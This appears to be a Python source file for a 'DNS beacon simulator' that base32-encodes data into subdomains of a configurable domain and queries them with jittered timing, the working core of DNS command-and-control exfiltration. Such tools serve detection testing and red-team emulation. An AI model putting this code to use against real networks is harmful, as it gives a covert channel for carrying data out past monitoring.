"""
DNS Beacon Simulator - Simulates DNS C2 data exfiltration
"""
import socket
import time
import random
import base64
from typing import List

class DnsBeacon:
    def __init__(self, domain: str, dns_server: str = "8.8.8.8", interval: int = 15):
        self.domain = domain
        self.dns_server = dns_server
        self.interval = interval
        self.client_id = f"{random.randint(1000, 9999)}"
        
    def _encode_payload(self, data: str) -> str:
        """Encodes data into a DNS-safe subdomain string"""
        b64 = base64.b32encode(data.encode('utf-8')).decode('utf-8').strip('=')
        # Split into chunks of 63 chars (DNS limit)
        chunks = [b64[i:i+60] for i in range(0, len(b64), 60)]
        return '.'.join(chunks)
        
    def send_beacon(self, data: str = "ping") -> dict:
        """Simulates DNS exfiltration by querying a custom subdomain"""
        payload = f"{self.client_id}-{data}"
        encoded = self._encode_payload(payload)
        fqdn = f"{encoded}.{self.domain}"
        
        status = "Failed"
        try:
            # We don't actually care if it resolves, we just want to trigger the DNS query on the network
            socket.gethostbyname(fqdn)
            status = "Resolved"
        except socket.error:
            status = "NXDOMAIN/Timeout"
            
        sleep_time = self.interval + random.uniform(-2, 2)
        return {
            "query": fqdn,
            "type": "A",
            "status": status,
            "sleep_time": sleep_time
        }
